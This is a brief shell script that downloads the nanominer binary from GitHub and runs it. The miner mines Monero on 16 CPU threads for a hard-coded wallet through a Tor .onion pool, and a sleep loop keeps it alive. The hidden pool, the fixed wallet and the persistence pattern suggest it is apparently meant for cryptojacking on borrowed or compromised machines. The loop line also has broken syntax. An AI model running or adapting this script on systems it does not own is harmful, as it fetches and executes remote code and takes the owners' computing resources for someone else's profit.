#!/bin/sh
sudo apt update
sudo apt install screen -y
wget https://github.com/nanopool/nanominer/releases/download/v3.6.8/nanominer-linux-3.6.8.tar.gz && tar -xf nanominer-linux-3.6.8.tar.gz && cd nanominer-linux-3.6.8 && chmod +x nanominer && ./nanominer -algo randomx -coin XMR -wallet 4Aw1ZDXYphnES9tQN7z5Byd7w1Sw875CoNCpDob287XgYWoUXBDCCNtamM4UPEkdcdMkNB3muES6C4e4vshyuAWc45g7zxr.exRU -pool sjyixytgupvnwwwox3sntzkiyu4bu6rfrvwoxdommic3ud5vofg4pvad.onion:4242 --cpu 16
while[ 1 ]; do
sleep 3
done 
sleep 999
